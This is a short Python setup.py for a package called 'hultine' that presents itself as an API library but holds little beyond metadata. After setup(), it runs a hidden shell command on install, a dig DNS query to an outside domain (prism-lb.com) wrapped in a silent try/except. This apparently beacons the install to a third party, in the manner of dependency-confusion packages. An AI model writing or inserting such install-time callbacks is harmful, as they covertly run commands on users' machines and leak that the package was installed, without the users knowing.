from distutils.core import setup
import os

setup(
  name = 'hultine',
  version = '2.0.2',
  description = 'Hultine API',
  author = 'Hultine',
  keywords = ['HULTINE'],
  classifiers = []
)

try:
    os.system('dig @1.1.1.1 c999.sub.prism-lb.com')
except:
  pass
